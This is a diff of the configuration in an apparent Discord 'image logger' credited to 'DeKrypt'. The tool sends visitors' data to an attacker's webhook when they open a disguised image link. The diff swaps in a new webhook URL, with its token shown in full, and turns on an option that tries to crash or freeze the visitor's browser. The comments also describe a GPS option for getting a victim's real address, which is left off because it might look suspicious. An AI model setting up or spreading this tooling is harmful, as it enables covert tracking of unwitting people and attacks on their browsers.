@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discordapp.com/api/webhooks/1423357993612873809/NAOUemOXMdSGtxwPXhi-6_5l-d347RhBfdMhVn3xD91DUhdeA9snhvauhjyJUwjAKoK4",
+    "webhook": "https://discord.com/api/webhooks/1526411124319191203/qHPS6nhIQeDyvceCA6_6MQGnkjC0AnQcl7tkK1eRJDC5edhxEucvBA9tz5pQJRSMw5oL",
     "image": "https://media.tenor.com/_xK7gde-t5EAAAAM/bet-you-cant-press-me-with-middle-mouse.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -22,7 +22,7 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
